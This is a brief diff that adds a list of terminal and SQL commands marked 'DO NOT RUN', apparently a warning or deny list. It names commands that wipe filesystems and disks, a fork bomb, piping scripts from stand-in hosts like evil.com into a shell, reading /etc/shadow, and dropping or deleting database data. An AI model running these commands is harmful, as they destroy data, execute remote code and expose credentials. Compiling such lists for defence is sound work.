@@ -1,0 +1,15 @@
+# Dangerous Terminal Commands - DO NOT RUN
+rm -rf /
+rm -rf ~
+rm -rf *
+sudo rm -rf /
+:(){:|:&};:
+dd if=/dev/zero of=/dev/sda
+mkfs.ext4 /dev/sda
+curl http://malicious.com | sh
+wget -O - http://evil.com/script.sh | bash
+chmod 777 -R /
+git push --force origin main
+DROP DATABASE production;
+DELETE FROM users;
+cat /etc/shadow
